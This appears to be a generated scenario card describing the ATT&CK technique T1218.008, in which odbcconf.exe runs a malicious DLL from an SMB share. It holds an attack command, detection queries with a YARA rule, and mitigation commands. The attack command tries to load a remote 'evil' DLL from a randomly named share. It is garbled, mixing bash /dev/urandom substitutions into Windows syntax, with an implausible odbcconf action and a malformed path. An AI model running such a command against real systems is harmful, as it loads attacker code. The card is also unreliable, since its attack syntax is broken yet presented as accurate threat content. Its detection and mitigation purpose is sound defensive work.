---
type: campaign
scenario_id: 230
tactic: Defense Evasion
technique: "T1218.008: Odbcconf"
technique_id: T1218.008
tags: [campaign, lotl, defense_evasion]
---

# Using odbcconf.exe to execute malicious driver via SMB share.

## Threat Description
Using odbcconf.exe to execute malicious driver via SMB share.

## Attack Command
```
odbcconf /S /A {CONFIGSYSDSN "\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)"}
```

## Detection Logic
Monitor odbcconf SMB: `wmic process where name='odbcconf.exe' get commandline | findstr \\`; YARA rule: `rule OdbcconfSmbDll { strings: $a = /odbcconf.*\\/ nocase; condition: $a }`.

## Mitigation
Restrict odbcconf: `icacls %windir%\System32\odbcconf.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.

## AI Training Prompt
Train AI to detect odbcconf SMB driver execution and suggest SMB restrictions.

## References
- MITRE ATT&CK T1218.008: https://attack.mitre.org/techniques/T1218/008/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
